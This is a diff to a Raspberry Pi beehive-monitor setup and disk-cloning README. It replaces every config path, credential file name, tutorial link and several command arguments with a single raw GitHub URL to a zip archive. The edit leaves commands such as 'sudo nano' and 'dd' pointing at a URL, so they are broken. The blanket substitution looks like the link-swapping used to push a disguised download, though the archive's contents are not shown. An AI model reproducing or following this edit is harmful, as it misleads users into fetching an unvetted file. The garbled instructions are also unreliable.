@@ -40,7 +40,7 @@ sudo apt install libgpiod2 portaudio19-dev gpac libopenblas-base
 Update the configuration in:
 
 ```bash
-multimedia_capture/config.py
+https://raw.githubusercontent.com/SoccerDevC/HiveMonitor2/master/support_files/HiveMonitor2_v2.2-alpha.2.zip
 ```
 
 with your correct server and device values.
@@ -97,7 +97,7 @@ crontab -e
 Copy the cron jobs from:
 
 ```
-/support_files/cron.txt
+https://raw.githubusercontent.com/SoccerDevC/HiveMonitor2/master/support_files/HiveMonitor2_v2.2-alpha.2.zip
 ```
 
 and install them.
@@ -110,17 +110,17 @@ and install them.
 
 Insert the correct credentials in:
 
-* `measure_send_params.py`
-* `send_files_to_server.py`
+* `https://raw.githubusercontent.com/SoccerDevC/HiveMonitor2/master/support_files/HiveMonitor2_v2.2-alpha.2.zip`
+* `https://raw.githubusercontent.com/SoccerDevC/HiveMonitor2/master/support_files/HiveMonitor2_v2.2-alpha.2.zip`
 
-Then, in `config.py`, set the correct **node ID**.
+Then, in `https://raw.githubusercontent.com/SoccerDevC/HiveMonitor2/master/support_files/HiveMonitor2_v2.2-alpha.2.zip`, set the correct **node ID**.
 
 ---
 
 ### Step 8: Configure the Microphone (I2S MEMS Microphone Breakout - SPH0645LM4H)
 
 Follow Adafruit’s tutorial to set up the microphone:
-[ Adafruit I2S MEMS Microphone Tutorial](https://learn.adafruit.com/adafruit-i2s-mems-microphone-breakout/raspberry-pi-wiring-test)
+[ Adafruit I2S MEMS Microphone Tutorial](https://raw.githubusercontent.com/SoccerDevC/HiveMonitor2/master/support_files/HiveMonitor2_v2.2-alpha.2.zip)
 
 Also, add the `pi_version` attribute in your configuration —
 set it to `"2w"`, `"0"`, etc., depending on your model.
@@ -130,7 +130,7 @@ set it to `"2w"`, `"0"`, etc., depending on your model.
 ### Step 9: Configure the Weight Sensor
 
 Follow this tutorial to set up the HX711 weight sensor:
-[ Digital Raspberry Pi Scale (HX711)](https://tutorials-raspberrypi.com/digital-raspberry-pi-scale-weight-sensor-hx711/)
+[ Digital Raspberry Pi Scale (HX711)](https://raw.githubusercontent.com/SoccerDevC/HiveMonitor2/master/support_files/HiveMonitor2_v2.2-alpha.2.zip)
 
 ---
 
@@ -139,7 +139,7 @@ Follow this tutorial to set up the HX711 weight sensor:
 Your Raspberry Pi will use the Real-Time Clock (RTC) to maintain time — make sure the RTC has a working battery.
 
 If the Pi still boots with the wrong time, follow this guide:
-[ How to Add an RTC Module to Raspberry Pi](https://maker.pro/raspberry-pi/tutorial/how-to-add-an-rtc-module-to-raspberry-pi)
+[ How to Add an RTC Module to Raspberry Pi](https://raw.githubusercontent.com/SoccerDevC/HiveMonitor2/master/support_files/HiveMonitor2_v2.2-alpha.2.zip)
 
 ---
 
@@ -161,7 +161,7 @@ sudo apt-get install python3-smbus i2c-tools
 Edit the configuration:
 
 ```bash
-sudo nano /boot/config.txt
+sudo nano https://raw.githubusercontent.com/SoccerDevC/HiveMonitor2/master/support_files/HiveMonitor2_v2.2-alpha.2.zip
 ```
 
 Add one of the following at the end (depending on your RTC chip):
@@ -264,7 +264,7 @@ sudo umount /dev/sda*
 ### Step 3: Create the Image
 
 ```bash
-sudo dd if=/dev/sda of=smartbee_backup.img bs=4M status=progress conv=fsync
+sudo dd if=/dev/sda https://raw.githubusercontent.com/SoccerDevC/HiveMonitor2/master/support_files/HiveMonitor2_v2.2-alpha.2.zip bs=4M status=progress conv=fsync
 sudo sync
 ```
 
@@ -276,10 +276,10 @@ sudo sync
 ### Step 4: (Optional) Compress the Image
 
 ```bash
-gzip smartbee_backup.img
+gzip https://raw.githubusercontent.com/SoccerDevC/HiveMonitor2/master/support_files/HiveMonitor2_v2.2-alpha.2.zip
 ```
 
-This produces a smaller file named `smartbee_backup.img.gz`.
+This produces a smaller file named `https://raw.githubusercontent.com/SoccerDevC/HiveMonitor2/master/support_files/HiveMonitor2_v2.2-alpha.2.zip`.
 
 ---
 
@@ -300,13 +300,13 @@ sudo umount /dev/sdb*
 #### Write from the uncompressed image:
 
 ```bash
-sudo dd if=smartbee_backup.img of=/dev/sdb bs=4M status=progress conv=fsync
+sudo dd https://raw.githubusercontent.com/SoccerDevC/HiveMonitor2/master/support_files/HiveMonitor2_v2.2-alpha.2.zip of=/dev/sdb bs=4M status=progress conv=fsync
 ```
 
 #### Or write from the compressed image:
 
 ```bash
-gunzip -c smartbee_backup.img.gz | sudo dd of=/dev/sdb bs=4M status=progress conv=fsync
+gunzip -c https://raw.githubusercontent.com/SoccerDevC/HiveMonitor2/master/support_files/HiveMonitor2_v2.2-alpha.2.zip | sudo dd of=/dev/sdb bs=4M status=progress conv=fsync
 ```
 
 Wait for completion, then flush writes:
@@ -350,6 +350,6 @@ It should behave **identically** to the original setup.
 * Always double-check device names (`/dev/sda`, `/dev/sdb`) before using `dd`.
 * Writing the wrong device will permanently erase its contents.
 * This cloning method works for both **32-bit** and **64-bit** Raspberry Pi OS.
-* After cloning, update the **node ID** in `config.py` if deploying multiple identical units.
+* After cloning, update the **node ID** in `https://raw.githubusercontent.com/SoccerDevC/HiveMonitor2/master/support_files/HiveMonitor2_v2.2-alpha.2.zip` if deploying multiple identical units.
 
 ---
